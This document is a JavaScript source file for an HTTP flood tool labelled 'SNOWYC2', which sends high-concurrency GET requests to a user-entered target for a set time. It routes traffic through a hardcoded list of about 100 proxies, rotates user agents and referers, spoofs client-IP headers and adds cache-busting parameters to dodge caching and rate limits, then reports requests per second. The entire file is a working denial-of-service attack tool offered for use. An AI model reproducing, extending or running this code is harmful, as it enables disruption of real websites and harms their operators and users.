const axios = require('axios');
const fs = require('fs');
const os = require('os');
const http = require('http');
const https = require('https');
const process = require('process');
const HttpsProxyAgent = require('https-proxy-agent');

const MAX_CONCURRENT = Math.min(os.cpus().length * 100, 5540);
const REQUEST_TIMEOUT = 10000;

const PROXIES = [
    "154.213.197.224:3128",
    "156.228.77.24:3128",
    "156.242.45.127:3128",
    "156.228.183.132:3128",
    "156.228.83.99:3128",
    "156.228.179.205:3128",
    "156.242.34.180:3128",
    "156.228.94.125:3128",
    "156.233.93.228:3128",
    "156.233.74.18:3128",
    "156.228.178.76:3128",
    "156.249.59.33:3128",
    "156.228.177.120:3128",
    "156.248.86.112:3128",
    "45.202.78.111:3128",
    "156.228.171.138:3128",
    "45.202.78.233:3128",
    "156.228.185.197:3128",
    "156.249.63.133:3128",
    "154.213.193.238:3128",
    "156.228.76.112:3128",
    "156.228.181.238:3128",
    "154.213.167.116:3128",
    "154.213.198.6:3128",
    "156.228.109.239:3128",
    "45.202.76.205:3128",
    "156.242.39.15:3128",
    "156.242.46.185:3128",
    "156.228.100.57:3128",
    "156.228.110.121:3128",
    "156.249.57.6:3128",
    "156.228.104.43:3128",
    "156.253.170.191:3128",
    "154.94.13.78:3128",
    "154.213.162.64:3128",
    "156.249.63.7:3128",
    "154.94.14.146:3128",
    "156.228.113.106:3128",
    "156.228.88.88:3128",
    "156.233.86.42:3128",
    "156.228.183.42:3128",
    "156.228.98.74:3128",
    "156.242.34.23:3128",
    "156.228.93.59:3128",
    "154.213.163.107:3128",
    "156.242.35.113:3128",
    "156.228.189.34:3128",
    "156.253.168.88:3128",
    "156.242.45.117:3128",
    "156.228.114.209:3128",
    "156.228.176.242:3128",
    "156.228.94.72:3128",
    "156.228.103.134:3128",
    "156.228.84.68:3128",
    "156.228.106.54:3128",
    "156.249.61.228:3128",
    "156.228.115.168:3128",
    "156.228.90.139:3128",
    "156.228.82.30:3128",
    "156.228.174.65:3128",
    "156.228.104.219:3128",
    "154.213.166.220:3128",
    "156.249.137.177:3128",
    "154.213.166.40:3128",
    "156.228.119.241:3128",
    "156.228.100.237:3128",
    "156.233.72.250:3128",
    "154.94.15.163:3128",
    "156.253.164.202:3128",
    "156.228.179.123:3128",
    "156.249.58.188:3128",
    "156.242.38.207:3128",
    "156.228.174.208:3128",
    "45.202.78.101:3128",
    "156.228.108.243:3128",
    "156.253.167.45:3128",
    "156.242.35.175:3128",
    "156.253.168.232:3128",
    "156.233.89.16:3128",
    "156.233.84.77:3128",
    "154.91.171.8:3128",
    "156.242.32.103:3128",
    "156.249.138.199:3128",
    "156.228.108.204:3128",
    "156.228.107.39:3128",
    "156.228.171.59:3128",
    "156.249.57.95:3128",
    "156.228.85.88:3128",
    "156.248.85.36:3128",
    "156.249.58.24:3128",
    "156.233.91.114:3128",
    "156.233.88.51:3128",
    "156.228.182.94:3128",
    "156.228.86.54:3128",
    "156.248.80.93:3128",
    "156.228.88.195:3128",
    "156.228.0.220:3128",
    "154.214.1.75:3128",
    "156.248.85.170:3128",
    "156.228.114.110:3128"
];

function loadLines(filename) {
    try {
        return fs.readFileSync(filename, 'utf8')
            .split('\n')
            .map(line => line.trim())
            .filter(line => line.length > 0);
    } catch {
        return [];
    }
}

const REFERERS = loadLines('refs.txt');
const USER_AGENTS = loadLines('ua.txt');

const UA_POOL = Array.from({ length: 10000 }, () =>
    USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0');

const keepAliveHttp = new http.Agent({ keepAlive: true });
const keepAliveHttps = new https.Agent({ keepAlive: true });

class AttackEngine {
    constructor(target, duration) {
        this.target = target;
        this.duration = duration * 1000;
        this.startTime = Date.now();
        this.stats = {
            total: 0,
            success: 0,
            errors: 0,
            peakRps: 0
        };
        this.uaIndex = 0;
        this.running = true;
    }

    getRandomUA() {
        this.uaIndex = (this.uaIndex + 1) % UA_POOL.length;
        return UA_POOL[this.uaIndex];
    }

    getRandomReferer() {
        return REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com';
    }

    getRandomProxy() {
        const proxy = PROXIES[Math.floor(Math.random() * PROXIES.length)];
        return `http://${proxy}`;
    }

    async makeRequest() {
        const randomIP = Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.');
        const headers = {
            'User-Agent': this.getRandomUA(),
            'Referer': this.getRandomReferer(),
            'X-Forwarded-For': randomIP,
            'X-Real-IP': randomIP,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        };

        const urlWithNoise = this.target + (this.target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2, 15)}`;

        let agent = this.target.startsWith('https') ? keepAliveHttps : keepAliveHttp;

        try {
            const proxyUrl = this.getRandomProxy();
            const proxyAgent = new HttpsProxyAgent(proxyUrl);

            await axios.get(urlWithNoise, {
                headers,
                timeout: REQUEST_TIMEOUT,
                httpAgent: proxyAgent,
                httpsAgent: proxyAgent,
                validateStatus: null
            });
            this.stats.success++;
        } catch (e) {
            // fallback to VPS if proxy fail
            try {
                await axios.get(urlWithNoise, {
                    headers,
                    timeout: REQUEST_TIMEOUT,
                    httpAgent: agent,
                    httpsAgent: agent,
                    validateStatus: null
                });
                this.stats.success++;
            } catch {
                this.stats.errors++;
            }
        }

        this.stats.total++;
    }

    async startWorkers() {
        const workers = [];
        for (let i = 0; i < MAX_CONCURRENT; i++) {
            workers.push(this.workerLoop());
        }
        await Promise.all(workers);
    }

    async workerLoop() {
        while (this.running && Date.now() - this.startTime < this.duration) {
            await this.makeRequest();
        }
    }

    async runAttack() {
        console.clear();
        console.log('\n  SNOWYC2 - T.ME/STSVKINGDOM');
        console.log('  ============================================');
        console.log(`  TARGET: ${this.target}`);
        console.log(`  TIME:   ${this.duration / 1000}s`);
        console.log(`  MODE:   RAPID STRIKE - ${MAX_CONCURRENT} Threads`);
        console.log('  ============================================\n');

        let lastTotal = 0;
        const printStats = setInterval(() => {
            const currentRps = (this.stats.total - lastTotal) / 0.2;
            lastTotal = this.stats.total;
            this.stats.peakRps = Math.max(this.stats.peakRps, currentRps);

            process.stdout.write(
                `\r  SENT: ${this.stats.total} | 200 OK: ${this.stats.success} | ERR: ${this.stats.errors} | RPS: ${currentRps.toFixed(1)} `
            );
        }, 200);

        await this.startWorkers();
        this.running = false;
        clearInterval(printStats);
        this.printSummary();
    }

    printSummary() {
        const elapsed = (Date.now() - this.startTime) / 1000;
        const avgRps = this.stats.total / elapsed;
        console.log('\n\n  ATTACK FINISHED');
        console.log('  ============================================');
        console.log(`  TIME:        ${elapsed.toFixed(1)}s`);
        console.log(`  TOTAL:       ${this.stats.total}`);
        console.log(`  SUCCESS:     ${this.stats.success}`);
        console.log(`  ERRORS:      ${this.stats.errors}`);
        console.log(`  AVG RPS:     ${avgRps.toFixed(1)}`);
        console.log(`  PEAK RPS:    ${this.stats.peakRps.toFixed(1)}`);
        console.log('  ============================================\n');
    }
}

(async () => {
    const readline = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const ask = (q) => new Promise(resolve => readline.question(q, resolve));

    const targetInput = await ask("TARGET: ");
    let target = targetInput.trim();
    if (!target.startsWith("http")) {
        target = "http://" + target;
    }

    const durationInput = await ask("TIME: ");
    readline.close();

    const duration = parseInt(durationInput);
    if (isNaN(duration)) {
        console.log("Invalid time input.");
        return;
    }

    const engine = new AttackEngine(target, duration);
    try {
        await engine.runAttack();
    } catch (err) {
        console.error("Attack failed:", err.message);
    }
})();
